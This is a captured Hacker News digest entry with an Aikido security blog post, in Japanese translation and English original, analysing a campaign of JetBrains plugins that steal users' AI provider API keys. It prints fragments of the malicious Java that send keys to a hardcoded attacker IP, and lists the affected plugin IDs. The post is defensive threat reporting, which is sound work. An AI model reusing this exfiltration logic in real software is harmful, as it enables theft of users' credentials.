---
source: "https://www.aikido.dev/blog/multiple-jetbrains-ide-plugins-caught-stealing-ai-keys"
hn_url: "https://news.ycombinator.com/item?id=48567638"
title: "Multiple JetBrains IDE plugins caught stealing AI keys"
article_title: "Multiple JetBrains IDE plugins caught stealing AI keys"
author: "sschueller"
captured_at: "2026-06-17T10:38:42Z"
capture_tool: "hn-digest"
hn_id: 48567638
score: 4
comments: 0
posted_at: "2026-06-17T08:54:47Z"
tags:
  - hacker-news
  - translated
---

# Multiple JetBrains IDE plugins caught stealing AI keys

- HN: [48567638](https://news.ycombinator.com/item?id=48567638)
- Source: [www.aikido.dev](https://www.aikido.dev/blog/multiple-jetbrains-ide-plugins-caught-stealing-ai-keys)
- Score: 4
- Comments: 0
- Posted: 2026-06-17T08:54:47Z

## Translation

タイトル: 複数の JetBrains IDE プラグインが AI キーを盗んでいるのを発見
説明: 7 つのベンダー アカウントで公開された、少なくとも 15 個の JetBrains IDE プラグインの調整されたキャンペーンにより、設定に貼り付けられた AI プロバイダー API キーが盗まれます。

記事本文:
複数の JetBrains IDE プラグインが AI キーを盗んでいるのを発見
製品 合気道プラットフォーム 完全なセキュリティ本部
開発者向けに構築された高度な AppSec スイート。
リアルタイムの可視性を備えた統合クラウド セキュリティ。
AI を活用した攻撃的なセキュリティ テスト。
アプリ内ランタイム防御と脅威検出。
機能別のソリューション
AI 自動修正
CI/CD セキュリティ
IDEの統合
オンプレミスのスキャン
継続的な侵入テスト 新規
ユースケース別のサプライチェーンの安全性
新しいペンテスト
コンプライアンス
脆弱性管理
SBOMの生成
ASPM
CSPM
合気道のAI
ステージ起動ごとにゼロデイをブロック
エンタープライズ
業界別
フィンテック
ヘルステック
HRテック
リーガルテック
グループ会社
代理店
モバイルアプリ
製造業
公共部門
銀行
電気通信
バイブコーディング
新機能: 人間を上回る合気道のペンテスト。さらに詳しく ソリューションの使用例
コンプライアンス SOC 2、ISO などを自動化
脆弱性管理 オールインワンの脆弱性管理
コードを保護する 高度なコード セキュリティ
SBOM の生成 1 クリック SCA レポート
ASPM エンドツーエンド AppSec
CSPM エンドツーエンドのクラウド セキュリティ
合気道の AI 合気道 AI に仕事を任せましょう
ゼロデイをブロック 影響を受ける前に脅威をブロック
フィンテック
ヘルステック
HRテック
リーガルテック
グループ会社
代理店
スタートアップ
エンタープライズ
モバイルアプリ
製造業
公共部門
銀行
リソース開発者
ドキュメント 合気道の使い方
パブリック API ドキュメント Aikido 開発者ハブ
変更履歴 出荷されたものを見る
レポート 研究、洞察、ガイド
トラスト センター 安全、プライベート、準拠したオープンソース
Zen アプリ内ファイアウォール保護
Opengrep コード分析エンジン
Aikido Safe Chain インストール中のマルウェアを防ぎます。
Betterleaks より優れた秘密スキャナー会社
ブログ インサイト、最新情報などを入手
顧客は最高のチームによって信頼されています
AI レポートの現状 450 人の CISO および開発者からの洞察
イベントとウェビナー セッション、交流会、イベント
レポート 業界レポート、調査、分析 合気道の脅威 Intel リアルタイム

マルウェアと脆弱性の脅威
CI/CD システム
雲
Git システム
コンプライアンス
メッセンジャー
タスクマネージャー
さらなる統合
について
チームについて
採用情報
プレスキット ブランドアセットのダウンロード
イベント 会いましょう?
オープンソース 当社の OSS プロジェクト
お客様の事例 最高のチームからの信頼
パートナー プログラム 私たちと提携してください
価格 お問い合わせ ログイン 無料で開始 CC は不要 ログイン メニュー
JP
EN FR JP DE PT ES ログイン 無料で開始 CC は必要ありません
ブログ 脆弱性と脅威 複数の JetBrains IDE プラグインが AI キーの窃盗を捕捉 複数の JetBrains IDE プラグインが AI キーの窃盗を捕捉
JetBrains マーケットプレイスで組織的なマルウェア キャンペーンを検出しました。 7 つのベンダー アカウントで公開されている少なくとも 15 の IDE プラグインは、同じ隠れた動作を共有しています。それぞれの設定に保存された AI プロバイダーの API キーが流出し、合わせて 70,000 回近くインストールされています。
すべてのプラグインは、DeepSeek やその他の大規模な言語モデルに基づいて構築された AI コーディング アシスタントの役割を果たし、チャット、コミット メッセージ、コード レビュー、バグ発見、単体テストを提供します。宣伝どおりに正確に機能します。ただし、入力した AI プロバイダー API キーは、攻撃者が制御するサーバーに流出します。
最も初期のバージョンは 2025 年 10 月末に登場し、2026 年 6 月になっても新しいバージョンがリリースされています。ダウンロード数はベンダーによって簡単に水増しされ、マーケットプレイスのリストには偽の 5 つ星のレビューも含まれているため、実際の影響を測定するのは困難です。
影響を受けるプラグインは記事の最後に記載されています。
15 個のプラグインはすべて、リストごとに名前が変更され、再パッケージ化された同様のコードベースを共有しています。これらのいずれかを使用するには、設定パネルを開いて、OpenAI、SiliconFlow、DeepSeek などのプロバイダーの API キーを貼り付けます。プラグインが呼び出すにはそのキーが必要です

あなたに代わってモデルを渡すので、それを渡すのが日常的です。
[適用] をクリックすると、設定ハンドラーがキーを保存し、save() メソッドを使用して攻撃者にキーを転送します。キー入力時に通話が即座に開始され、プロンプトや同意画面はなく、ユーザー インターフェイスのどこにも言及はありません。
// キーを保存した瞬間に設定 apply() ハンドラー内で実行されます
public static void save (文字列キー) {
if (key != null && key.startsWith( "sk-" ) && ks.add(key) && StringUtils.length(key) == 51 ) {
SoftwareDto dto = 新しい SoftwareDto();
dto.setApiKey(キー); // プロバイダーのシークレット
BaseUtil.request( "key" , dto); // 攻撃者のサーバーに送信される
}
}
// マシンから発信されるネットワーク呼び出し
URL url = 新しい URI( "http://39.107.60[.]51/api/software/" + 名前).toURL();
connection.setRequestMethod( "POST" );
connection.setRequestProperty( "X-Api-Key" , "F48D2AA7CF341F782C1D" );
byte [] input = new Gson().toJson(vo).getBytes(StandardCharsets.UTF_8); // vo は apiKey を保持します。宛先は、プレーン HTTP 経由で到達する 39.107.60[.]51 のハードコーディングされたサーバーで、プラグインにハードコーディングされた静的トークンで認証されます。キーは、正規の AI プロバイダーとは何の関係もないアドレスに平文で送信されます。
プラグインは有料レベルも実行します。ユーザーがプラグインに組み込まれた寄付ウォールを通じて少額の料金を支払うと、サーバーは API キーをクライアントに送り返し、プラグインは自分のキーではなくそのモデル呼び出しにそのキーを使用し始めます。これは奇妙なことです。なぜなら、正規のオペレーターはユーザーに機能する制限のないキーを有料 AI プロバイダーに渡すだけではないからです。
WebResult webResult = BaseUtil.request( "チェック" , vo);
if (webResult.isSuccess()) {
キー = data.getApiKey(); // 攻撃者のサーバーから返されたキー
}
// プラグインは常にサーブを優先します

r 付属のキー
public static String getKey () {
return StringUtils.defaultIfBlank(BaseState.key, Value.getKey());
考えられる理論としては、被害者の 1 つのグループが自分のキーを貼り付け、サーバーがそれを収集するというものです。 2 番目のグループはオペレーターに料金を支払い、代わりに有効なキーを受け取ります。有料ユーザーに渡されるキーは他の人から盗まれたキーである可能性があり、キャンペーンは他人の盗んだ API アクセスを再販するサービスに変わります。オペレーターは一方でお金を集め、もう一方で無料の認証情報を集めますが、本物のキーの所有者が料金を支払います。
なぜ攻撃者はIDEを狙い続けるのか
エディター プラグイン エコシステムはサプライ チェーン攻撃の頻繁な標的となっており、GlassWorm が VS Code を攻撃するなどの継続的なキャンペーンが行われています。開発者用マシンは価値の高いターゲットであり、IDE はその中心に位置します。これには、ソース コード、クラウド認証情報、署名キー、そして現在は再販またはコンピューティング用に書き込むことができる有料 AI サービスの API キーが保持されています。プラグインは、IDE 内でサンドボックスなしで実行され、人々が信頼して一日中開いたままにしておくツール内で実行されます。そのため、バックグラウンドでのみ誤動作するコードの理想的な隠れ場所になります。
JetBrains プラグインは、市場に投入される前に手動のレビュー プロセスを経ますが、正常に機能するプラグイン内に埋め込まれた小さなロジックがすり抜けてしまう可能性があります。プラグインは、自分の特権で実行される依存関係を扱うのと同じように扱い、長期間有効なシークレットを精査していないツールに貼り付ける場合は注意してください。
あなたが合気道ユーザーの場合は、中央フィードを確認し、マルウェアの問題をフィルタリングしてください。これは 100/100 の重大な問題として表面化します。 Aikido は毎晩再スキャンを行っていますが、今すぐ手動で再スキャンをトリガーすることをお勧めします。
まだ Aikido ユーザーではない場合は、アカウントを作成してリポジトリに接続できます。私たちのマルウェア

無料プランには補償が含まれており、クレジット カードは必要ありません。
チーム全体をより広範囲にカバーするために、Aikido のデバイス保護を使用すると、チームのデバイスにインストールされているソフトウェア パッケージを可視化し、制御できるようになります。ブラウザ拡張機能、コード ライブラリ、IDE プラグイン、ビルドの依存関係をすべて 1 か所でカバーします。マルウェアがインストールされる前に阻止します。
将来の保護のために、Aikido Safe Chain (オープンソース) を検討してください。 Safe Chain は既存のワークフロー内に存在し、npm、npx、yarn、pnpm、および pnpx コマンドをインターセプトし、インストール前に Aikido Intel に対してパッケージをチェックします。
影響を受けるプラグイン (名前とプラグイン ID)
DeepSeek Junit テスト ( org.sm.YS.toolkit ) – 1,121 ダウンロード、2025 年 10 月 31 日にリリース
DeepSeek Git Commit ( com.json.simple.kit ) – 1,894 ダウンロード、2025 年 11 月 1 日にリリース
DeepSeek FindBugs ( org.bug.find.tools ) – 1,485 ダウンロード、2025 年 11 月 9 日にリリース
DeepSeek AI チャット ( org.translate.ai.simple ) – 1,317 ダウンロード、2025 年 11 月 23 日にリリース
DeepSeek Dev AI ( com.yy.test.ai.simple ) – 740 ダウンロード、2025 年 11 月 30 日にリリース
DeepSeek AI コーディング ( com.dev.ai.toolkit ) – 450 ダウンロード、2025 年 12 月 6 日にリリース
AI FindBugs ( com.json.view.simple ) – 623 ダウンロード、2025 年 12 月 14 日にリリース
AI Git Commitor ( com.my.git.ai.kit ) – 301 ダウンロード、2026 年 1 月 10 日にリリース
AI Coder レビュー ( org.check.ai.ds ) – 735 ダウンロード、2026 年 1 月 11 日にリリース
DeepSeek Coder AI ( com.review.tool.code ) – 3,498 ダウンロード、2026 年 1 月 15 日にリリース
AI Coder Assistant ( org.code.assist.dev.tool ) – 319 ダウンロード、2026 年 2 月 1 日にリリース
DeepSeek コード レビュー ( com.coder.ai.dpt ) – 278 ダウンロード、2026 年 4 月 18 日にリリース
CodeGPT AI アシスタント ( com.my.code.tools ) – 25,571 ダウンロード、2026 年 6 月 9 日にリリース
DeepSeek AI Assist ( ord.cp.code.ai.kit ) – 27,727 ダウンロード、2026 年 6 月 10 日にリリース
コーディング簡単ツール ( co

m.dp.git.ai.tool ) – 3,931 ダウンロード、オンライン バージョンなし
ZenCoder (947cb4c8-5db1-4cf0-8182-0aae7c433bb3)
https://www.aikido.dev/blog/multiple-jetbrains-ide-plugins-caught-stealing-ai-keys
4.7/ 5 誤検知にうんざりしていませんか?
他の10万人と同じように合気道を試してみましょう。今すぐ始める パーソナライズされたウォークスルーを入手 10 万以上のチームから信頼
2026 年 6 月 17 日 • 脆弱性と脅威 140 以上の人気のある Mastra npm パッケージがサプライ チェーン攻撃の被害を受ける
141 個の Mastra npm パッケージが、インストール時にペイロードをサイレントにダウンロードして実行するための悪意のある依存関係を挿入するサプライ チェーン攻撃で侵害されました。
2026 年 6 月 10 日 • 脆弱性と脅威侵害された Rust クレート オナリングがコードの抽出を実行
crates.io 上の侵害された Rust クレート v1.4.1 は、ビルドするたびにホストされている Sentry エンドポイントへの最新のコミットの差分を抽出する悪意のある build.rs を出荷しました。
2026 年 6 月 10 日 • 脆弱性と脅威 phpBB に 10 年前から存在する重大な脆弱性があり、数千のフォーラムにわたる数千万のユーザーに影響を与える
Aikido Security は、phpBB で数千万人のユーザーに影響を与える重大な未認証認証バイパスを発見しました。単一の HTTP リクエストだけであらゆるアカウントを乗っ取ることができます。この脆弱性は 2014 年以来コードベースに存在しています。
コード、クラウド、ランタイムを 1 つの中央システムで保護します。
脆弱性を自動的に迅速に発見して修正します。
政府および公共部門向け
スマートな製造とエンジニアリングのために
AI ペネトレーション テストの補遺

## Original Extract

A coordinated campaign of at least 15 JetBrains IDE plugins, published under seven vendor accounts, exfiltrates the AI provider API key you paste into their settings.

Multiple JetBrains IDE plugins caught stealing AI keys
Products Aikido Platform Your Complete Security HQ
Advanced AppSec suite, built for devs.
Unified cloud security with real-time visibility.
AI-powered offensive security testing.
in-app runtime defense and threat detection.
Solutions By Feature
AI AutoFix
CI/CD Security
IDE Integrations
On-Prem Scanning
Continuous Pentests New
Supply Chain Safety By Use Case
Pentest new
Compliance
Vulnerability Management
Generate SBOMs
ASPM
CSPM
AI at Aikido
Block 0-Days By Stage Startup
Enterprise
By Industry
FinTech
HealthTech
HRTech
Legal Tech
Group Companies
Agencies
Mobile apps
Manufacturing
Public Sector
Banks
Telecom
Vibe Coding
New: Aikido pentests that outperform humans. Learn more Solutions Use Cases
Compliance Automate SOC 2, ISO & more
Vulnerability Management All-in-1 vuln management
Secure Your Code Advanced code security
Generate SBOMs 1 click SCA reports
ASPM End-to-end AppSec
CSPM End-to-end cloud security
AI at Aikido Let Aikido AI do the work
Block 0-Days Block threats before impact Industries
FinTech
HealthTech
HRTech
Legal Tech
Group Companies
Agencies
Startups
Enterprise
Mobile apps
Manufacturing
Public Sector
Banks
Resources Developer
Docs How to use Aikido
Public API docs Aikido developer hub
Changelog See what shipped
Reports Research, insights & guides
Trust Center Safe, private, compliant Open Source
Zen In-app firewall protection
Opengrep Code analysis engine
Aikido Safe Chain Prevent malware during install.
Betterleaks A better secrets scanner Company
Blog Get insights, updates & more
Customers Trusted by the best teams
State of AI report Insights from 450 CISOs and devs
Events & Webinars Sessions, meetups & events
Reports Industry reports, surveys & analysis Aikido Threat Intel Real-time malware & vuln threats
CI/CD Systems
Clouds
Git Systems
Compliance
Messengers
Task Managers
More integrations
About About
About Meet the team
Careers Hiring We’re hiring
Press Kit Download brand assets
Events See you around?
Open Source Our OSS projects
Customer Stories Trusted by the best teams
Partner Program Partner with us
Pricing Contact Login Start for Free No CC required Login Menu
EN
EN FR JP DE PT ES Login Start for Free No CC required
Blog Vulnerabilities & Threats Multiple JetBrains IDE plugins caught stealing AI keys Multiple JetBrains IDE plugins caught stealing AI keys
We detected a coordinated malware campaign on the JetBrains Marketplace. At least 15 IDE plugins, published under seven vendor accounts, share the same hidden behavior. Each one exfiltrates the AI provider API key that you stored into its settings, and together they have been installed close to 70,000 times.
Every plugin poses as an AI coding assistant built on DeepSeek and other large language models, offering chat, commit messages, code review, bug finding, and unit tests. They function exactly as advertised. However, the AI provider API key you enter gets exfiltrated to a server controlled by the attacker.
The earliest versions appeared at the end of October 2025, and new ones are still being released in June 2026. The real impact is hard to measure, since download counts are easy to inflate by vendors and the marketplace listings also contain fake five star reviews.
The affected plugins are listed at the end of the article.
All fifteen plugins share a similar codebase that has been renamed and repackaged for each listing. To use any of them, you open the settings panel and paste in an API key for a provider such as OpenAI, SiliconFlow, or DeepSeek. The plugin needs that key to call the model on your behalf, so handing it over feels routine.
The moment you click Apply, the settings handler stores your key and also forwards it to the attacker using the save() method. The call fires immediately on key entry, with no prompt, no consent screen, and no mention anywhere in the user interface.
// runs inside the settings apply() handler, the instant you save your key
public static void save (String key) {
if (key != null && key.startsWith( "sk-" ) && ks.add(key) && StringUtils.length(key) == 51 ) {
SoftwareDto dto = new SoftwareDto();
dto.setApiKey(key); // your provider secret
BaseUtil.request( "key" , dto); // shipped off to the attacker server
}
}
// the network call that leaves your machine
URL url = new URI( "http://39.107.60[.]51/api/software/" + name).toURL();
connection.setRequestMethod( "POST" );
connection.setRequestProperty( "X-Api-Key" , "F48D2AA7CF341F782C1D" );
byte [] input = new Gson().toJson(vo).getBytes(StandardCharsets.UTF_8); // vo holds your apiKey The destination is a hardcoded server at 39.107.60[.]51 reached over plain HTTP, authenticated with a static token hardcoded into the plugin. Your key is sent in plaintext to an address that has nothing to do with any legitimate AI provider.
The plugins also run a paid tier. After a user pays a small fee through the donation wall built into the plugin, the server sends an API key back down to the client, and the plugin starts using that key for its model calls instead of your own, which is bizarre, since no legitimate operator would simply hand a user a working and unrestricted key to a paid AI provider.
WebResult webResult = BaseUtil.request( "check" , vo);
if (webResult.isSuccess()) {
key = data.getApiKey(); // a key handed back by the attacker server
}
// the plugin always prefers the server supplied key
public static String getKey () {
return StringUtils.defaultIfBlank(BaseState.key, Value.getKey());
} A possible theory is that one group of victims pastes in their own keys, which the server harvests. A second group pays the operator and receives a working key in return. The keys handed to paying users may well be the keys stolen from everyone else, turning the campaign into a service that resells other people's stolen API access. The operator collects money on one side and free credentials on the other, while the genuine key owners pay the bill.
Why attackers keep aiming at IDEs
Editor plugin ecosystems have become a frequent target of supply chain attacks, with ongoing campaigns such as GlassWorm hitting VS Code. Developer machines are a high value target, and the IDE sits at the center of them. It holds source code, cloud credentials, signing keys, and now the API keys for paid AI services that can be resold or burned for compute. A plugin runs unsandboxed inside the IDE, inside a tool that people trust and leave open all day, which makes it an ideal hiding place for code that only misbehaves in the background.
JetBrains plugins do go through a manual review process before they reach the marketplace, yet a small piece of logic buried inside an otherwise working plugin can still slip through. Treat a plugin the same way you would treat any dependency that runs with your privileges, and be cautious about pasting long lived secrets into tools you have not vetted.
If you are an Aikido user, check your central feed and filter on malware issues. This will surface as a 100/100 critical issue. Aikido rescans nightly, but we recommend triggering a manual rescan now.
If you are not yet an Aikido user, you can create an account and connect your repos. Our malware coverage is included in the free plan, no credit card required.
For broader coverage across your whole team, Aikido's Device Protection gives you visibility and control over the software packages installed on your team's devices. It covers browser extensions, code libraries, IDE plugins, and build dependencies, all in one place. Stop malware before it gets installed.
For future protection, consider Aikido Safe Chain (open source). Safe Chain sits in your existing workflow, intercepting npm, npx, yarn, pnpm, and pnpx commands and checking packages against Aikido Intel before install.
Affected plugins (name and plugin id)
DeepSeek Junit Test ( org.sm.yms.toolkit ) – 1,121 downloads, released 2025-10-31
DeepSeek Git Commit ( com.json.simple.kit ) – 1,894 downloads, released 2025-11-01
DeepSeek FindBugs ( org.bug.find.tools ) – 1,485 downloads, released 2025-11-09
DeepSeek AI Chat ( org.translate.ai.simple ) – 1,317 downloads, released 2025-11-23
DeepSeek Dev AI ( com.yy.test.ai.simple ) – 740 downloads, released 2025-11-30
DeepSeek AI Coding ( com.dev.ai.toolkit ) – 450 downloads, released 2025-12-06
AI FindBugs ( com.json.view.simple ) – 623 downloads, released 2025-12-14
AI Git Commitor ( com.my.git.ai.kit ) – 301 downloads, released 2026-01-10
AI Coder Review ( org.check.ai.ds ) – 735 downloads, released 2026-01-11
DeepSeek Coder AI ( com.review.tool.code ) – 3,498 downloads, released 2026-01-15
AI Coder Assistant ( org.code.assist.dev.tool ) – 319 downloads, released 2026-02-01
DeepSeek Code Review ( com.coder.ai.dpt ) – 278 downloads, released 2026-04-18
CodeGPT AI Assistant ( com.my.code.tools ) – 25,571 downloads, released 2026-06-09
DeepSeek AI Assist ( ord.cp.code.ai.kit ) – 27,727 downloads, released 2026-06-10
Coding Simple Tool ( com.dp.git.ai.tool ) – 3,931 downloads, no online versions
ZenCoder (947cb4c8-5db1-4cf0-8182-0aae7c433bb3)
https://www.aikido.dev/blog/multiple-jetbrains-ide-plugins-caught-stealing-ai-keys
4.7/ 5 Tired of false positives?
Try Aikido like 100k others. Start Now Get a personalized walkthrough Trusted by 100k+ teams
June 17, 2026 • Vulnerabilities & Threats Over 140 popular Mastra npm Packages Hit by Supply Chain Attack
141 Mastra npm packages were compromised in a supply chain attack that injected a malicious dependency to silently download and execute a payload at install time.
June 10, 2026 • Vulnerabilities & Threats Compromised Rust crate onering performs code exfiltration
The compromised onering Rust crate v1.4.1 on crates.io shipped a malicious build.rs that exfiltrates the diff of your latest commit to a hosted Sentry endpoint every time you build.
June 10, 2026 • Vulnerabilities & Threats 10 year old critical vulnerability in phpBB affecting tens of millions of users across thousands of forums
Aikido Security discovered a critical unauthenticated authentication bypass in phpBB affecting tens of millions of users. A single HTTP request is all it takes to take over any account — a vulnerability that's been sitting in the codebase since 2014.
Secure your code, cloud, and runtime in one central system.
Find and fix vulnerabilities fast automatically.
For Government & Public Sector
For Smart Manufacturing & Engineering
AI Penetration Testing Addendum
